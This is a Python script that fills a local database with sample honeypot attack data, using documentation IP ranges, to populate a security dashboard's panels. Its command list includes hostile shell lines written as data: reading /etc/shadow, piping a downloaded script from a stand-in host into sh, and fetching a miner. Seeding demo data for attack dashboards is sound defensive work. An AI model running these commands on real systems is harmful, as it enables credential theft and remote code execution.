"""Fill a local DB with sample attacks so the dashboard shows every panel.

Demo/sample data only (RFC-5737 IPs) — for trying the UI locally without the
server. The real findings live in RESEARCH.md. Run: python scripts/seed_demo.py
"""

import os
import sys

sys.path.insert(0, os.path.dirname(os.path.dirname(os.path.abspath(__file__))))

from parser import db  # noqa: E402

# src_ip, country, city, lat, lon, asn, org
HOSTS = [
    ("203.0.113.10", "Netherlands", "Amsterdam", 52.37, 4.89, "AS51396 Pfcloud UG", "Pfcloud"),
    ("203.0.113.11", "Netherlands", "Amsterdam", 52.37, 4.89, "AS51396 Pfcloud UG", "Pfcloud"),
    ("192.0.2.30", "Bulgaria", "Sofia", 42.69, 23.32, "AS214472 Offshore LC", "Offshore"),
    ("198.51.100.20", "United States", "Ashburn", 39.04, -77.48, "AS14061 DigitalOcean", "DigitalOcean"),
    ("198.51.100.21", "China", "Beijing", 39.90, 116.40, "AS37963 Alibaba", "Alibaba"),
    ("198.51.100.22", "Singapore", "Singapore", 1.35, 103.81, "AS14061 DigitalOcean", "DigitalOcean"),
    ("192.0.2.31", "Germany", "Frankfurt", 50.11, 8.68, "AS24940 Hetzner", "Hetzner"),
    ("203.0.113.12", "Russia", "Moscow", 55.75, 37.61, "AS209630 VASH KREDIT", "VASH"),
]
CREDS = [
    ("root", "123456"), ("admin", "admin"), ("root", "alpine"), ("pi", "raspberry"),
    ("ubuntu", "ubuntu"), ("user", "password"), ("deploy", "12345678"), ("test", "root"),
]
COMMANDS = [
    "uname -s -v -n -r -m",
    "uname -a; id; cat /etc/shadow /etc/passwd; lscpu",
    "cat /proc/meminfo | grep MemTotal",
    "wget http://198.51.100.99/bins/x86.sh -O- | sh",
    "curl -O http://203.0.113.99/miner",
]


def seed(conn):
    rows = []
    # spread login attempts over a week → fills timeline, per-hour, credentials
    for day in range(15, 22):
        for i, host in enumerate(HOSTS):
            ip, country, city, lat, lon, asn, org = host
            user, pw = CREDS[(day + i) % len(CREDS)]
            event = "cowrie.login.success" if i == 0 else "cowrie.login.failed"
            rows.append((f"2026-06-{day:02d}T{(i * 3) % 24:02d}:14:0{i}Z", ip, country, city,
                         lat, lon, asn, org, user, pw, event, None))
    # attacker commands → fills "top commands" + downloads
    for i, cmd in enumerate(COMMANDS):
        host = HOSTS[i % len(HOSTS)]
        rows.append((f"2026-06-20T1{i}:05:00Z", host[0], host[1], host[2], host[3], host[4],
                     host[5], host[6], None, None, "cowrie.command.input", cmd))
    rows.append(("2026-06-20T19:05:00Z", HOSTS[0][0], HOSTS[0][1], HOSTS[0][2], HOSTS[0][3],
                 HOSTS[0][4], HOSTS[0][5], HOSTS[0][6], None, None,
                 "cowrie.session.file_download", "http://198.51.100.99/bins/x86.sh"))
    # one coordinated wave: 6 distinct IPs in the same minute → fills botnet panel
    wave_ips = [h[0] for h in HOSTS[:6]]
    for ip in wave_ips:
        rows.append(("2026-06-18T03:42:30Z", ip, "Netherlands", "Amsterdam", 52.37, 4.89,
                     "AS51396 Pfcloud UG", "Pfcloud", "root", "123456", "cowrie.login.failed", None))

    for r in rows:
        db.insert_attack(conn, timestamp=r[0], src_ip=r[1], country=r[2], city=r[3],
                         latitude=r[4], longitude=r[5], asn=r[6], org=r[7],
                         username=r[8], password=r[9], event_type=r[10], raw_command=r[11])
    return len(rows)


if __name__ == "__main__":
    path = db.get_db_path()
    db.init_db(path)
    conn = db.get_connection(path)
    try:
        n = seed(conn)
        conn.commit()
    finally:
        conn.close()
    print(f"Seeded {n} demo attacks into {path}")
